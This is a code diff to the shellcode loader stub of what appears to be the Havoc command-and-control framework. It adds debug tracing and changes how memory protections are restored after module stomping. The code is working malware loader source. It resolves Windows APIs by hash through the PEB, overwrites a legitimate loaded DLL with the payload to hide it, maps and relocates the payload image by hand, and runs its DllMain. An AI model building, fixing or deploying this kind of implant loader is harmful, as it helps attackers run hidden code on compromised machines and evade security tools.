@@ -9,6 +9,23 @@
 #define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
 #endif
 
+// debug tracing: resolves OutputDebugStringA from kernel32 at runtime.
+// use DebugView (or VS Code "Run > Attach Debugger") to view the messages.
+#define KERNEL32_HASH           0x6ddb9555
+#define OUTPUTDEBUGSTRINGA_HASH 0x490fc1d5
+
+typedef VOID ( WINAPI *OUTPUTDEBUGSTRINGA )( LPCSTR );
+
+SEC( text, B ) VOID DbgTrace( UINT_PTR Kernel32, PCHAR Message )
+{
+    if ( Kernel32 == 0 || Kernel32 == ( UINT_PTR ) -1 )
+        return;
+
+    OUTPUTDEBUGSTRINGA pOutputDebugStringA = ( OUTPUTDEBUGSTRINGA ) LoaderFuncAdd( Kernel32, OUTPUTDEBUGSTRINGA_HASH );
+    if ( pOutputDebugStringA )
+        pOutputDebugStringA( Message );
+}
+
 // markers the teamserver locates & patches in the shellcode template to enable
 // module stomping and set the decoy module name at build time.
 #define STOMP_TARGET_MARKER     L"HAVOC_STOMP_TARGET"
@@ -72,7 +89,16 @@ SEC( text, B ) VOID Entry( VOID )
         KaynLibraryLdr = KaynCaller( );
     }
 
+    // resolve ntdll FIRST so we can trace even if kernel32 fails
     Instance.Modules.Ntdll = LoaderModPebbb( NTDLL_HASH );
+
+    // ultra-early trace: use NTDLL's own debug output path (DbgPrint is not
+    // available, so we still need kernel32 for OutputDebugStringA — but if
+    // kernel32 lookup fails we now fall through safely thanks to the guard)
+    UINT_PTR Kernel32 = LoaderModPebbb( KERNEL32_HASH );
+    DbgTrace( Kernel32, "[stub] Entry: starting" );
+    if ( Kernel32 == 0 || Kernel32 == ( UINT_PTR ) -1 )
+        DbgTrace( Kernel32, "[stub] WARNING: kernel32 not found" );
 
     Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
     Instance.Win32.LdrGetDllHandle         = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRGETDLLHANDLE );
@@ -80,10 +106,14 @@ SEC( text, B ) VOID Entry( VOID )
     Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
     Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );
 
+    DbgTrace( Kernel32, "[stub] functions resolved" );
+
     NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
     KHdrSize  = SecHeader[ 0 ].VirtualAddress;
     KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
+
+    DbgTrace( Kernel32, "[stub] DLL located, PE headers parsed" );
 
     // Optional module stomping: overwrite a legitimate, already-loaded module
     // image with our payload. enabled per-build by the teamserver (gStompEnabled).
@@ -103,26 +133,41 @@ SEC( text, B ) VOID Entry( VOID )
         // explicitly clear StompBase: if both LdrGetDllHandle and LdrLoadDll
         // fail, StompBase must be NULL so we don't deref a garbage pointer
         StompBase = NULL;
+        DbgTrace( Kernel32, "[stub] stomp: looking for target DLL" );
         if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
         {
             StompBase = NULL;
+            DbgTrace( Kernel32, "[stub] stomp: not loaded, trying LdrLoadDll" );
             if ( ! NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase ) ) )
+            {
                 StompBase = NULL;
+                DbgTrace( Kernel32, "[stub] stomp: LdrLoadDll FAILED" );
+            }
         }
 
         if ( StompBase )
         {
+            DbgTrace( Kernel32, "[stub] stomp: got target DLL handle" );
             StompNt   = C_PTR( StompBase + ( ( PIMAGE_DOS_HEADER ) StompBase )->e_lfanew );
             StompSize = StompNt->OptionalHeader.SizeOfImage;
 
             // only stomp if the target can hold the entire payload image
             if ( StompSize >= NtHeaders->OptionalHeader.SizeOfImage )
             {
+                DbgTrace( Kernel32, "[stub] stomp: target size OK, using stomp base" );
                 KVirtualMemory = StompBase;
                 KHdrSize       = 0;
                 KMemSize       = NtHeaders->OptionalHeader.SizeOfImage;
                 Mapped         = TRUE;
             }
+            else
+            {
+                DbgTrace( Kernel32, "[stub] stomp: target too small, falling back" );
+            }
+        }
+        else
+        {
+            DbgTrace( Kernel32, "[stub] stomp: no target DLL, falling back" );
         }
     }
 
@@ -131,6 +176,7 @@ SEC( text, B ) VOID Entry( VOID )
 
     if ( Mapped )
     {
+        DbgTrace( Kernel32, "[stub] memory ready, copying sections" );
         // TODO: find the base address of this shellcode in a better way?
         KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
         KaynArgs.DllCopy   = KaynLibraryLdr;
@@ -160,6 +206,8 @@ SEC( text, B ) VOID Entry( VOID )
         ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
         if ( ImageDir->VirtualAddress )
             KaynLdrReloc( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );
+
+        DbgTrace( Kernel32, "[stub] relocations applied, setting protections" );
 
         for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
         {
@@ -196,22 +244,26 @@ SEC( text, B ) VOID Entry( VOID )
             Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
         }
 
-        // when stomping: restore RX over the image (skip the dangerous tail-free:
-        // NtFreeVirtualMemory MEM_RELEASE requires RegionSize=0 and the allocation
-        // base, which we don't have for a loaded DLL — partial release of a
-        // module mapping is invalid and would crash)
+        // when stomping: restore protection on the PE header region only.
+        // do NOT blanket-protect the whole image as PAGE_EXECUTE_READ — that
+        // would make .data read-only and crash DllMain when it writes globals.
+        // the per-section protections set above are already correct.
         if ( gStompEnabled == 1 )
         {
+            // protect just the first section's pages (the PE headers live there)
             SecMemory     = KVirtualMemory;
-            SecMemorySize = NtHeaders->OptionalHeader.SizeOfImage;
-            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_EXECUTE_READ, &OldProtection );
+            SecMemorySize = NtHeaders->OptionalHeader.SizeOfHeaders;
+            if ( SecMemorySize > 0 )
+                Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READONLY, &OldProtection );
         }
 
         // --------------------------------
         // 6. Finally executing our DllMain
         // --------------------------------
+        DbgTrace( Kernel32, "[stub] calling DllMain" );
         BOOL ( WINAPI *LLDKman ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
         LLDKman( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
+        DbgTrace( Kernel32, "[stub] DllMain returned" );
     }
 }
 
